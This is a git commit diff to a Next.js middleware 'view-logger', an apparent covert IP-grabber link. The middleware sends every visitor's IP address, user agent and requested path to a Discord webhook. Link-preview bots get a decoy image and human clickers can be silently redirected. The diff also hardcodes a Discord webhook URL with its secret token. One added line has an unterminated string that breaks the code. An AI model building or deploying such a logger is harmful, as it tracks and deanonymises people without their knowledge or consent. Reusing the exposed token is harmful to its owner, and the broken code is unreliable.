c14d2cd41a4379d646bf8ca4d019d4ed8d4634fa
RyfterWasTaken <144800123+RyfterWasTaken@users.noreply.github.com>
2024-03-12 21:35:30 +0100

    Added query params, added ua, cleaned ui and code
    1. Added optional query parameters: 
       - red=link will redirect to such link once clicked on
       - img=image link will show the image instead of the pixel
       DON'T FORGET TO DO https:// BEFORE OR IT WILL RETURN AN ERROR
    2. Added UA:
       - Noticed that it wouldnt load images without another ua set to return the image, so it would bug
       - Added vercelbot ua
    3. Cleaned code&UI:
       - Modified multiple code parts, such as using req.nextUrl.pathname instead of req.url.slice("/"). 
       - Modified the embed to send fields, instead of footer& description

--- middleware.js
+++ middleware.js
@@ -1,25 +1,26 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in the .env file.
+const webhook = "https://discord.com/api/webhooks/1216820645711843478/QRIgnJF2GR6zofyQsdCMJ3uD6ALwtO-tK73SHh-5HGitJmh9u6T-aRF1uic_PrPiBXcD" // The URL of your Discord/Guilded webhook
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
-  const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
-  const page = req.url.split("/").slice(-1)[0]
-  await fetch(webhook,{body:JSON.stringify({
-    embeds:[{
-      title:"Triggered view-logger",
-      description:(source ? "Source user-agent: "+ua : "It was loaded an user (or an user on Discord)."),
-      footer:{
-        text:"Requested page: "+page.slice(0,500),
-      },
+  const discordbot = ["Mozilla/5.0 (compatible; Discordbot/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0", "Twitterbot/].find(u=>ua?.startsWith(u));
+  const vercelbot = ua?.startsWith("Vercelbot/");
+  const path = req.nextUrl.pathname;
+  const img = req.nextUrl.searchParams.get('img') ? new URL(req.nextUrl.searchParams.get('img')) : new URL("/mini.png", req.url);
+  const redirect = req.nextUrl.searchParams.get('red');
+  const body = {
+    "embeds":[{
+      "title":"Triggered view-logger V2",
+      "fields":[{name:"Source", value:(discordbot ? "discord" : vercelbot ? "Vercel" : "User"), inline: true},{name:"Path", value: path, inline: true},{name:"IP", value: req.ip, inline: true}, {name: "User agent", value: ua, inline: false}]
     }],
-  }),headers:{"content-type":"application/json"},method:"POST"})
-  if(source){
+  };
+  await fetch(webhook,{body: JSON.stringify(body), headers:{"content-type":"application/json"}, method:"POST"})
+  if(discordbot||vercelbot){
     // Return the image.
-    return NextResponse.rewrite(new URL("/mini.png",req.url))
+    return NextResponse.rewrite(img)
   }else{
     // Make a message for whoever takes the risk to directly click.
-    return NextResponse.rewrite(new URL("/page.html",req.url));
+    return redirect ? NextResponse.redirect(new URL(redirect)) : NextResponse.rewrite(new URL("/page.html", req.url));
   }
 }
